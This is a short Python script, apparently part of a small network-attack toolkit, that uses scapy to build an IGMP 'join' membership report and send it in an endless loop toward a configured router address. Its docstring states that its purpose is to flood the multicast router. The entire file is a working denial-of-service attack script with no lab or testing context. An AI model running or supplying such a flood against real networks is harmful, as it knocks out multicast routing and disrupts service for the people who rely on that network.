#!venv/bin/python

from scapy.all import *
from scapy.contrib.igmp import IGMP
from scapy.all import Ether, IP
import settings

"""
Just flooding the IGMP multicast router by sending many 'join' requests
"""


pck = Ether()/IP(dst=settings.destination_ip)/IGMP(type=22, gaddr=settings.destination_ip)
pck.show()
sendp(pck, iface=settings.source_interface, loop=1)